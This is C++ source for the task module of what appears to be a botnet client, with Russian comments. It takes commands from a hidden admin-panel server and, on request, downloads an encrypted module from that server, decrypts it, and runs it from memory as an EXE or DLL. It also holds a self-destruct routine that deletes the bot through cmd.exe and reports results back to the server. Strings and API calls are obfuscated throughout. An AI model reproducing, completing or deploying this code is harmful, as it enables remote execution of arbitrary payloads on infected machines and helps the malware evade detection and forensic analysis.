#include "../Utils/Debug_to_file.h"
#include "../BotWorks/Crypt.h"
#include "../BotWorks/BotWorks.h"
#include "../Includes/Common.h"
#include "../Includes/MemLimits.h"
#include "../Utils/XorStr.h"
#include "../String/StringHelpers.h"

#include "TaskWorks.h"

#define LOAD_MODULE_ERROR (-1)

static wchar_t post_reqv[1024];
static uint8_t ascii_reqv[1024 * sizeof(wchar_t)];
static wchar_t unicode[1024];
static wchar_t PostStr[1024];

static int (*start_module)(wchar_t* params) = nullptr; //Указатель на функции запуска модуля

static void send_error(wchar_t* botId, char* id_command, uint32_t castom_error, uint32_t get_last_error) {

	char* Data = (char*)hAlloc(MAX_MODULE_SIZE);
	if (Data == nullptr) {
		DEBUG_TO_FILE("+++ NO hFree MEMORY\r\n");
		return;
	}

	static wchar_t unicode_id_com[1024];

	ASCIIToUnicode((char*)id_command, unicode_id_com);

	//Загрузить модуль из админки
	API(USER32, wsprintfW)(post_reqv, L"%s|%s|%d|%d|", unicode_id_com, botId, castom_error, get_last_error);

	UnicodeToASCII(post_reqv, (char*)ascii_reqv);

	uint32_t size_data = strlen((const char*)ascii_reqv) + 1;

	DWORD Module_size = 0;

	uint8_t* data_to_send = nullptr;
	data_to_send = gen_data_to_send(ascii_reqv, size_data);
	if (data_to_send == nullptr) {
		hFree(Data);
		DEBUG_TO_FILE("+++ data_to_send is nullptr \r\n");
		return;
	}

	ASCIIToUnicode((char*)data_to_send, unicode);

	//Посылка запроса в админку на регистрацию бота
	API(USER32, wsprintfW)(PostStr, L"tes=1&data=%s", unicode);
	PostRequestParts(hide_admin_path(), 0, hide_error_path(), PostStr, &Module_size, (BYTE*)Data);
	hFree(Data);
}



void do_destroy() {

	static wchar_t path_bot[1024];
	static wchar_t str_to_destroy[1024];

	static char ascii_to_print[sizeof(wchar_t)*1024];

	//Определение полного пути до запущенного бота
	API(KERNEL32, GetModuleFileNameW)(nullptr, path_bot, sizeof(path_bot)/sizeof(path_bot[0]));

	strCpyW(str_to_destroy, hide_str_to_destroy());
	API(KERNEL32, lstrcatW)(str_to_destroy, path_bot);

	UnicodeToASCII(str_to_destroy, ascii_to_print);
	API(SHELL32, ShellExecuteA)(nullptr, XorStr("open"), XorStr("cmd.exe"), ascii_to_print, nullptr, SW_SHOWNORMAL);
	API(KERNEL32, ExitProcess)(0);
	return;
}

static DWORD WINAPI ThreadFunc(LPVOID lpParam)
{
	LoadModule((char*)lpParam);
	return 0;
}

int parse_task_and_exec(wchar_t* botId, char* DecResponse) {

	int ret_code = 0;
	int count = 0;
	bool is_found = false;

	char* id_command = nullptr;
	char* command_name = nullptr;
	char* params_ptr = nullptr;
	char* run_module = nullptr;
	char* name_module = nullptr;

	//Парсинг параметров
	char* task = strTokA((char*)DecResponse, "|");
	if (task != nullptr) {
		id_command = strTokA(nullptr, "|");
	}

	if (id_command != nullptr) {
		command_name = strTokA(nullptr, "|");
	}

	//Проверка параметров
	if ((task == nullptr) || (id_command == nullptr) || (command_name == nullptr)) {
		//Возвратить ошибку
		DEBUG_TO_FILE("+++ ERROR PARAM\r\n");
		send_error(botId, id_command, LOAD_MODULE_ERROR, GetLastError());
		return LOAD_MODULE_ERROR;
	}

	if (!strCmpA((char*)command_name, hide_str_self_destroy())) { //Нужно запустить команду дестрой
		send_error(botId, id_command, 0, 0);
		do_destroy();
	}
	else {//Нужно запустить модуль
		if (!strCmpA((char*)command_name, hide_str_run_module())) {
			name_module = strTokA((char*)nullptr, "|");
			if (name_module == nullptr) {
				//Возвратить ошибку
				DEBUG_TO_FILE("+++ ERROR PARAM\r\n");
				send_error(botId, id_command, LOAD_MODULE_ERROR, GetLastError());
				return LOAD_MODULE_ERROR;
			}

			//Определение параметров модуля
			params_ptr = strTokA((char*)nullptr, "|");
			static char params[1024];
			if (params_ptr != nullptr) {
				strCpyA(params, params_ptr);
			}
			
			char* Module = (char*)hAlloc(MAX_MODULE_SIZE);
			if (Module == nullptr) {
				DEBUG_TO_FILE("+++ NO hFree MEMORY\r\n");
				send_error(botId, id_command, ENOMEM, GetLastError());
				return ENOMEM;
			}

			char* Module_dec = (char*)hAlloc(MAX_MODULE_SIZE);
			if (Module_dec == nullptr) {
				DEBUG_TO_FILE("+++ NO hFree MEMORY\r\n");
				send_error(botId, id_command, ENOMEM, GetLastError());
				return ENOMEM;
			}

			strCatA(name_module, "|");

			//Загрузить модуль из админки
			uint32_t size_data = strLenA((const char*)name_module) + 1;
			DWORD Module_size = 0;
			uint8_t* data_to_send = nullptr;
			data_to_send = gen_data_to_send((uint8_t*)name_module, size_data);
			if (data_to_send == nullptr) {
				DEBUG_TO_FILE("+++ data_to_send is nullptr \r\n");
				hFree(Module);
				hFree(Module_dec);
				send_error(botId, id_command, LOAD_MODULE_ERROR, GetLastError());
				return LOAD_MODULE_ERROR;
			}

			ASCIIToUnicode((char*)data_to_send, unicode);
			//Посылка запроса в админку на регистрацию бота
			wsprintf(PostStr, L"tes=1&data=%s", unicode);

			int ret = PostRequestParts(hide_admin_path(), 0, hide_download_module_path(), PostStr, &Module_size, (BYTE*)Module);
			if (Module_size == 0) {
				send_error(botId, id_command, LOAD_MODULE_ERROR, GetLastError());
				hFree(Module);
				hFree(Module_dec);
				return LOAD_MODULE_ERROR;
			}

			//Расшифровать модуль
			decrypt_recv_data((uint8_t*)Module, Module_size - 32, (uint8_t*)Module_dec);

			//Определение что запускать EXE или DLL
			char* pch = strTokA(name_module, ".");
			if (pch != nullptr) {
				pch = strTokA(nullptr, ".");
			}

			if (pch != nullptr) {
				if (!strCmpA(pch, hide_str_exe())) {// Нужно запустить EXE
					send_error(botId, id_command, 0, 0);
					API(KERNEL32, Sleep)(2000);
					if (params != nullptr) {
						DWORD dwThreadId = 0;
						API(KERNEL32,CreateThread)(nullptr, 0, ThreadFunc, Module_dec, 0, &dwThreadId);
					}
					return 0;
				}
			}

			DEBUG_TO_FILE("Start dll...\r\n", __LINE__);

			//Если модуль длл, то загрузим его из памяти
			//Загрузка модуля и получения указателя на нужную функцию
			HMODULE hModule = (HMODULE)LoadModule((char*)Module_dec);
			if (hModule == 0) {
				DEBUG_TO_FILE("+++ Load_module error (LoadModule)\r\n");
				send_error(botId, id_command, LOAD_MODULE_ERROR, GetLastError());
				hFree(Module);
				hFree(Module_dec);
				return LOAD_MODULE_ERROR;
			}

			(FARPROC&)start_module = GetModuleProcAddress(hModule, (char*)"start_module");
			if (!start_module) {
				DEBUG_TO_FILE("+++ Load_module error (GetApiAddr)\r\n");
				send_error(botId, id_command, LOAD_MODULE_ERROR, GetLastError());
				FreeLoadedModule(hModule);
				hFree(Module);
				hFree(Module_dec);
				return LOAD_MODULE_ERROR;
			}

			if (params != nullptr) {
				ASCIIToUnicode((char*)params, unicode);
			}

			ret = start_module(unicode);
			if (ret == 0) {
				send_error(botId, id_command, 0, 0);
			}
			else {
				send_error(botId, id_command, ret, GetLastError());
			}

			//Чистка
			FreeLoadedModule(hModule);
			hFree(Module);
			hFree(Module_dec);
		}
	}
	return 0;
}